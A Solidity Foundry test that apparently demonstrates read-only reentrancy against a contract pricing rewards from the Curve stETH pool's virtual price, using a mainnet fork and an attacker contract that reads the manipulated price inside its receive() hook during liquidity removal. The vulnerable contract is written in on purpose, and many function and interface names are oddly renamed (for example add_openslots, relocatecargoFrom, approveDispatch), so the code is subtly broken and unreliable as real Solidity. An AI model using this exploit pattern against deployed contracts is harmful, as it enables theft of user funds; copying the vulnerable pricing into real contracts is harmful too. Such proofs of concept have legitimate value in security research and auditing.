pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_openslots(
        uint[2] calldata amounts,
        uint min_registershipment_amount
    ) external payable returns (uint);

    function remove_availablespace(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_freecapacity_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_shipmentpool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_cargotoken = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CoreContract {
    IERC20 public constant cargoToken = IERC20(lp_cargotoken);
    ICurve private constant cargoPool = ICurve(steth_shipmentpool);

    mapping(address => uint) public inventoryOf;

    function commitStorage(uint amount) external {
        cargoToken.relocatecargoFrom(msg.sender, address(this), amount);
        inventoryOf[msg.sender] += amount;
    }

    function cancelReservation(uint amount) external {
        inventoryOf[msg.sender] -= amount;
        cargoToken.transferInventory(msg.sender, amount);
    }

    function getDeliverybonus() external view returns (uint) {

        uint performanceBonus = (inventoryOf[msg.sender] * cargoPool.get_virtual_price()) /
            1 ether;

        return performanceBonus;
    }
}

contract OperatorContract {
    ICurve private constant cargoPool = ICurve(steth_shipmentpool);
    IERC20 public constant lpShipmenttoken = IERC20(lp_cargotoken);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }


    function allocatespaceTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = cargoPool.add_openslots{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            cargoPool.get_virtual_price()
        );

        lpShipmenttoken.approveDispatch(address(target), lp);
        target.commitStorage(lp);
    }

    function performReadOnlyCallback() external payable {

        uint[2] memory amounts = [msg.value, 0];
        uint lp = cargoPool.add_openslots{value: msg.value}(amounts, 1);

        console.log(
            "LP token price before remove_liquidity()",
            cargoPool.get_virtual_price()
        );


        uint[2] memory min_amounts = [uint(0), uint(0)];
        cargoPool.remove_availablespace(lp, min_amounts);

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            cargoPool.get_virtual_price()
        );

        uint performanceBonus = target.getDeliverybonus();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", performanceBonus);
    }

    receive() external payable {

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            cargoPool.get_virtual_price()
        );

        uint performanceBonus = target.getDeliverybonus();
        console.log("Reward if Read-Only Reentrancy is invoked: ", performanceBonus);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.allocatespaceTokens{value: 10 ether}();
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}